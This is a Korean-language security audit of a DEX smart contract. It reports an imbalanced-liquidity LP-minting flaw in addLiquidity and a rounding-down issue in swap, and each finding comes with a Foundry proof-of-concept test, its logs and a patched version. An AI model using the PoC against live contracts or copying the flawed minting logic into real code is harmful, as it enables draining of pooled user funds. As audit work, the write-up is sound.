# 임나라

## Imbalance AddLiquidity
#### Dex.sol:addLiquidity:92
**High (공격 파급력: Critical, 공격 난이도: Low)**

```solidity
/*
* addLiquidit
* ERC-20 기반 LP 토큰을 사용해야 합니다. 
*/ 
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) external returns (uint256 LPTokenAmount){
    // 0개 공급은 안됨
    require(tokenXAmount > 0, "tokenXAmount is 0");
    require(tokenYAmount > 0, "tokenYAmount is 0");
    // msg.sender가 dex한테 tokenX와 tokenB에 대한 권한을 줘야함 -> pool에 공급하는 양 만큼!
    require(tokenX.allowance(msg.sender, address(this)) >= tokenXAmount, "ERC20: insufficient allowance");
    require(tokenY.allowance(msg.sender, address(this)) >= tokenYAmount, "ERC20: insufficient allowance");
    // msg.sender의 token 보유량이 공급하려는 양보다 많아야 함
    require(tokenX.balanceOf(msg.sender) >= tokenXAmount, "ERC20: transfer amount exceeds balance");
    require(tokenY.balanceOf(msg.sender) >= tokenYAmount, "ERC20: transfer amount exceeds balance");

    update();

    // 같은 양을 넣더라도 넣는 시점의 상황(수수료 등등)을 고려해서 reward를 해줘야 함 -> totalSupply 값을 이용해서 LPT 계산
    if (totalSupply() == 0) {
        LPTokenAmount = tokenXAmount * tokenYAmount;
    } else {
        **LPTokenAmount = tokenXAmount * totalSupply() / tokenXpool;**
    }

    // 인자로 받은 LP토큰 최소값보다 작으면 안됨
    require(LPTokenAmount >= minimumLPTokenAmount, "less than minimum");
    // 만족하는 경우 msg.sender한테 LPT 토큰 발행해줌
    _mint(msg.sender, LPTokenAmount);

    // msg.sender가 공급해준만큼 amountX(Y)를 추가해줌
    tokenXpool += tokenXAmount;
    tokenYpool += tokenYAmount;

    //transferFrom으로 msg.sender의 토큰을 DEX로 가져옴
    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
}
```

첫번째 LP 토큰 생성 이후 imbalnace 체크를 하지 않기 때문에 tokenXAmount를 많이 넣고, tokenYAmount를 적게 넣어서 많은 양의 LP 토큰을 mint할 수 있다.

#### PoC

```solidity
function testLPTokenAmount() external {
    uint lp1 = dex.addLiquidity(1000 ether, 1000 ether, 0);
    uint lp2 = dex.addLiquidity(1000 ether, 1 ether, 0);
    assertTrue(lp1 == lp2,"");

    vm.startPrank(user1);
    dex.addLiquidity(100000 ether, 100000 ether, 0);
    vm.stopPrank();

    (uint rx, uint ry) = dex.removeLiquidity(lp2, 0, 0);
    console.log("INPUT X: %d", 1000 ether);
    console.log("INPUT Y: %d", 1 ether);
    console.log("REAL RX: %d", rx);
    console.log("REAL RY: %d", ry);
}
```

```solidity
[PASS] testLPTokenAmount() (gas: 279765)
Logs:
  INPUT X: 1000000000000000000000
  INPUT Y: 1000000000000000000
  REAL RX: 1000000000000000000000
  REAL RY: 990205882352941176470
```

위와 같이 1000 ether, 1000 ether로 유동성을 공급했을 때의 LP token의 양과 1000 ether, 1 ether로 유동성을 공급했을 때 받아오는 LP token의 양이 동일하다.

removeLiquidity로 유동성을 빼내올때 받아오는 REAL RY의 양이 공급한 RY의 양보다 훨씬 많은것을 확인할 수 있다.

#### 해결방안

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) external returns (uint256 LPTokenAmount){
    // 0개 공급은 안됨
    require(tokenXAmount > 0, "tokenXAmount is 0");
    require(tokenYAmount > 0, "tokenYAmount is 0");
    // msg.sender가 dex한테 tokenX와 tokenB에 대한 권한을 줘야함 -> pool에 공급하는 양 만큼!
    require(tokenX.allowance(msg.sender, address(this)) >= tokenXAmount, "ERC20: insufficient allowance");
    require(tokenY.allowance(msg.sender, address(this)) >= tokenYAmount, "ERC20: insufficient allowance");
    // msg.sender의 token 보유량이 공급하려는 양보다 많아야 함
    require(tokenX.balanceOf(msg.sender) >= tokenXAmount, "ERC20: transfer amount exceeds balance");
    require(tokenY.balanceOf(msg.sender) >= tokenYAmount, "ERC20: transfer amount exceeds balance");

    update();

    // 같은 양을 넣더라도 넣는 시점의 상황(수수료 등등)을 고려해서 reward를 해줘야 함 -> totalSupply 값을 이용해서 LPT 계산
    if (totalSupply() == 0) {
        LPTokenAmount = tokenXAmount * tokenYAmount;
    }
    else{
        uint liquidity_x = totalSupply() * tokenXAmount / tokenXpool;
        uint liquidity_y = totalSupply() * tokenYAmount / tokenYpool;
        LPTokenAmount = (liquidity_x > liquidity_y) ? liquidity_y:liquidity_x;

        if(LPTokenAmount == liquidity_y){
            tokenXAmount = tokenXpool * tokenYAmount / tokenYpool;
        }else{
            tokenYAmount = tokenYpool * tokenXAmount / tokenXpool;
        }
    }
    // 인자로 받은 LP토큰 최소값보다 작으면 안됨
    require(LPTokenAmount >= minimumLPTokenAmount, "less than minimum");
    // 만족하는 경우 msg.sender한테 LPT 토큰 발행해줌
    _mint(msg.sender, LPTokenAmount);

    // msg.sender가 공급해준만큼 amountX(Y)를 추가해줌
    tokenXpool += tokenXAmount;
    tokenYpool += tokenYAmount;

    //transferFrom으로 msg.sender의 토큰을 DEX로 가져옴
    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
}
```

```solidity
[FAIL. Reason: Assertion failed.] testLPTokenAmount() (gas: 291833)
Logs:
  Error: 
  Error: Assertion Failed
  INPUT X: 1000000000000000000000
  INPUT Y: 1000000000000000000
  REAL RX: 1000000000000000000
  REAL RY: 1000000000000000000
```

tokenXAmount, tokenYAmount도 수정해주는 과정에서 imbalance로 인한 토큰 균형이 깨지는 것도 막았다.

## **Swap Small Amount Round Down**
#### Dex.sol:swap:40
**Informational (공격 파급력: Low, 공격 난이도: Low)**

```solidity
function swap(uint256 tokenXAmount, uint256 tokenYAmount, uint256 tokenMinimumOutputAmount) external returns (uint256 outputAmount){
    //둘 중 하나는 무조건 0이어야 함
    require(tokenXAmount == 0 || tokenYAmount == 0, "must have 0 amount token");
    require(tokenXpool > 0 && tokenYpool > 0, "can't swap");

    update();

    /* tokenXAmount가 0
    * 사용자 기준 : y를 주고 x를 받아오는 것
    * dex 기준 : y를 받고 x를 돌려주는 것
    * xy = (x-dx)(y+dy) -> dx = (x * dy) / (y + dy)
    */
    if(tokenXAmount == 0) {      
        // 선행 수수료
        outputAmount = (tokenXpool * (tokenYAmount * 999 / 1000)) / (tokenYpool + (tokenYAmount * 999 / 1000));
        
        // 최소값 검증
        require(outputAmount >= tokenMinimumOutputAmount, "less than Minimum");

        // output만큼 빼주고 받아온만큼 더해주기
        tokenXpool -= outputAmount;
        tokenYpool += tokenYAmount;

        // 보내기
        tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
        tokenX.transfer(msg.sender, outputAmount);
    } 
    /* tokenXAmount가 0이 아니면? -> tokenYAmount가 0일 것
    * 사용자 기준 : x를 주고 y를 받아오는 것
    * dex 기준 : x를 받고 y를 돌려주는 것
    * xy = (x+dx)(y-dy) -> (y * dx) / (x + dx)
    */
    else {
        outputAmount = (tokenYpool * (tokenXAmount * 999 / 1000)) / (tokenXpool + (tokenXAmount * 999 / 1000));

        require(outputAmount >= tokenMinimumOutputAmount, "less than Minimum");

        tokenYpool -= outputAmount;
        tokenXpool += tokenXAmount;

        tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
        tokenY.transfer(msg.sender, outputAmount);
    }
}
```

수수료를 tokenXAmount에 곱해주는 과정에서 RoundDown이 일어난다.

#### PoC

```solidity
function testSmallSwapRoundDown() external {
    uint lp = dex.addLiquidity(1000 ether, 1000 ether, 0);
    uint output = dex.swap(999 wei, 0, 0);
    console.log("output: %d", output);
}
```

```solidity
[PASS] testSmallSwapRoundDown() (gas: 194841)
Logs:
  output: 997
```

#### 해결방안

```solidity
function swap(uint256 tokenXAmount, uint256 tokenYAmount, uint256 tokenMinimumOutputAmount) external returns (uint256 outputAmount){
    //둘 중 하나는 무조건 0이어야 함
    require(tokenXAmount == 0 || tokenYAmount == 0, "must have 0 amount token");
    require(tokenXpool > 0 && tokenYpool > 0, "can't swap");

    update();

    /* tokenXAmount가 0
    * 사용자 기준 : y를 주고 x를 받아오는 것
    * dex 기준 : y를 받고 x를 돌려주는 것
    * xy = (x-dx)(y+dy) -> dx = (x * dy) / (y + dy)
    */
    if(tokenXAmount == 0) {      
        // 선행 수수료
        outputAmount = (tokenXpool * ((tokenYAmount * 10 ** 18) * 999 / 1000)) / ((tokenYpool * 10 ** 18) + ((tokenYAmount * 10 ** 18) * 999 / 1000));
        
        // 최소값 검증
        require(outputAmount >= tokenMinimumOutputAmount, "less than Minimum");

        // output만큼 빼주고 받아온만큼 더해주기
        tokenXpool -= outputAmount;
        tokenYpool += tokenYAmount;

        // 보내기
        tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
        tokenX.transfer(msg.sender, outputAmount);
    } 
    /* tokenXAmount가 0이 아니면? -> tokenYAmount가 0일 것
    * 사용자 기준 : x를 주고 y를 받아오는 것
    * dex 기준 : x를 받고 y를 돌려주는 것
    * xy = (x+dx)(y-dy) -> (y * dx) / (x + dx)
    */
    else {
        outputAmount = (tokenYpool * ((tokenXAmount * 10 ** 18) * 999 / 1000)) / ((tokenXpool * 10 ** 18) + ((tokenXAmount * 10 ** 18) * 999 / 1000));

        require(outputAmount >= tokenMinimumOutputAmount, "less than Minimum");

        tokenYpool -= outputAmount;
        tokenXpool += tokenXAmount;

        tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
        tokenY.transfer(msg.sender, outputAmount);
    }
}
```

outputAmount를 계산할때 분자와 분모에 10 ** 18을 곱해줌으로써 round down을 완화했다.
